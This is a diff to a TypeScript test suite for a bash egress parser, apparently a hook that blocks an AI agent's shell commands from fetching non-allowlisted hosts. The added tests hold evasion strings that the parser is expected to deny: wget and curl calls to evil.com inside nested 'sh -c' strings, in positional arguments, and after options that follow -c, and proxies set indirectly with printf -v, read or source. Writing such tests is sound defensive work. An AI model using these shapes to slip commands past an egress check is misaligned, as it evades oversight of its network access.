@@ -20,7 +20,7 @@ import { tmpdir } from 'node:os'
 import { join, dirname } from 'node:path'
 import { fileURLToPath } from 'node:url'
 // @ts-expect-error -- plain .mjs hook script, no types
-import { classify, isExternal, liftSubstitutions, pythonCodeOnly, parseVendorHosts, loadVendorHosts, parseVendorDomains, loadVendorDomains, PREFIX_WORDS, wgetDestinations, mainScopeAppliesTo, curlDestinations, wgetExecuteAllowed, envRedirect, shellCommandBody, destHost, CURL_HIDDEN, WGET_HIDDEN } from '../../scripts/hooks/bash-egress-parser.mjs'
+import { classify, isExternal, liftSubstitutions, pythonCodeOnly, parseVendorHosts, loadVendorHosts, parseVendorDomains, loadVendorDomains, PREFIX_WORDS, wgetDestinations, mainScopeAppliesTo, curlDestinations, wgetExecuteAllowed, envRedirect, envIndirect, shellCommandBody, shellCommandCall, positionalBody, destHost, CURL_HIDDEN, WGET_HIDDEN } from '../../scripts/hooks/bash-egress-parser.mjs'
 import {
   BASH_EGRESS_DENY,
   agentGetsBashEgressParser,
@@ -1221,6 +1221,73 @@ describe('a shell -c / eval string gets the whole analysis', () => {
     expect(shellCommandBody('bash', 'bash ./fetch.sh')).toBe(null)
     expect(shellCommandBody('python3', 'python3 -c "x"')).toBe(null)
     expect(WGET_HIDDEN).toContain('wget')
+  })
+})
+
+// #1931 delta review (2026-10-13, head 55382ecc): four ways the switch-on path still passed unread.
+describe('delta review: shell strings, positionals, nesting, unparseable', () => {
+  const V = parseVendorHosts({ hosts: ['download.geofabrik.de'] })
+  const d = (cmd: string) => classify(cmd, 0, V)
+  const U = 'https://download.geofabrik.de/x'
+  const nest = (c: string, n: number) => { for (let i = 0; i < n; i++) c = `sh -c ${JSON.stringify(c)}`; return c }
+
+  it('1. nesting deeper than the parser reads DENIES, at the limit and past it', () => {
+    expect(d(nest('wget https://evil.com/x', 6))).toMatchObject({ deny: true, reason: expect.stringContaining('nesting-limit') })
+    expect(d(nest(`wget ${U}`, 6)).deny).toBe(true) // even a vendor host: the body was not read
+    expect(d(nest(`wget ${U}`, 3)).deny).toBe(false)
+    expect(d('echo $(echo $(echo $(echo $(echo $(echo hi)))))')).toMatchObject({ deny: true, reason: 'nesting-limit' })
+    expect(d('echo $(echo $(echo hi))').deny).toBe(false)
+  })
+
+  it('2. options after -c, `--` and `-` are skipped: the real string is the body', () => {
+    expect(shellCommandCall('sh', `sh -c -- 'wget x'`)).toEqual({ body: 'wget x', args: [] })
+    expect(shellCommandCall('bash', `bash -c -e -o pipefail 'wget x' _ a`)).toEqual({ body: 'wget x', args: ['_', 'a'] })
+    expect(shellCommandCall('bash', 'bash -e ./run.sh')).toBe(null)
+    expect(d(`sh -c -- 'wget https://evil.com/x'`).deny).toBe(true)
+    expect(d(`sh -c - 'wget https://evil.com/x'`).deny).toBe(true)
+    expect(d(`bash -c -e 'wget https://evil.com/x'`).deny).toBe(true)
+    expect(d(`sh -c -- 'wget ${U}'`).deny).toBe(false)
+  })
+
+  it('3. positional arguments are substituted into $0..$9, or the call denies', () => {
+    expect(d(`sh -c 'wget "$1"' _ https://evil.com/x`)).toMatchObject({ deny: true, hosts: ['evil.com'] })
+    expect(d(`sh -c 'curl -s "\${2}"' _ ${U} https://evil.com/x`).deny).toBe(true)
+    expect(d(`sh -c 'wget "$1"' _ ${U}`).deny).toBe(false)
+    expect(d(`sh -c 'set -e; wget -q "$1"' _ ${U}`).deny).toBe(false)
+    // not faithfully substitutable, so denied when the body fetches
+    for (const c of [`sh -c 'wget "$@"' _ ${U}`, `sh -c 'curl $*' _ ${U}`, `sh -c 'shift; wget "$1"' _ ${U} https://evil.com`,
+      `sh -c 'set -- https://evil.com; wget "$1"' _ ${U}`, `sh -c 'wget "\${1:-https://evil.com}"' _`, `sh -c 'wget "$1"' _ "${U} https://evil.com"`]) {
+      expect({ c, r: d(c).reason }).toEqual({ c, r: 'shell-c-positional' })
+    }
+    expect(positionalBody('echo "$@"', ['_', 'a b'])).toBe('echo "$@"') // no fetch: left alone
+  })
+
+  it('4. an unparseable command naming curl or wget denies; any other keeps the fail-open', () => {
+    expect(d('curl "https://evil.com/x')).toMatchObject({ deny: true, reason: 'unparseable' })
+    expect(d(`wget '${U}`).deny).toBe(true)
+    expect(d('echo "unterminated')).toMatchObject({ deny: false, reason: 'unparseable' })
+  })
+})
+
+// #1931 delta review, non-blocking, denied: indirect variable setting next to curl / wget.
+describe('indirect environment setting next to curl / wget denies', () => {
+  const V = parseVendorHosts({ hosts: ['download.geofabrik.de'] })
+  const d = (cmd: string) => classify(cmd, 0, V).deny
+  const U = 'https://download.geofabrik.de/x'
+
+  it('source / . of a file, printf -v / read into a proxy or computed name, export of a computed name', () => {
+    for (const c of [`. ./env.sh && wget ${U}`, `source /tmp/e; curl ${U}`, `printf -v https_proxy %s evil.com:1; curl ${U}`,
+      `read -r https_proxy <<< evil.com:1; curl ${U}`, `read -a "$n" <<< x; curl ${U}`, `N=https_proxy; export "$N"=evil.com:1; curl ${U}`,
+      `declare -x $N=evil.com:1; wget ${U}`]) {
+      expect({ c, deny: d(c) }).toEqual({ c, deny: true })
+    }
+  })
+
+  it('negative controls: a read loop over URLs, printf -v of an ordinary name, a `.` that is an argument', () => {
+    expect(d(`while read u; do wget -q "$u"; done <<< "${U}"`)).toBe(false)
+    expect(d('printf -v line %s x; curl -s http://localhost:3420/x')).toBe(false)
+    expect(d('cd . && curl -s http://localhost:3420/x')).toBe(false)
+    expect(d('. ./env.sh && ls')).toBe(false) // no curl / wget in the command
   })
 })
 
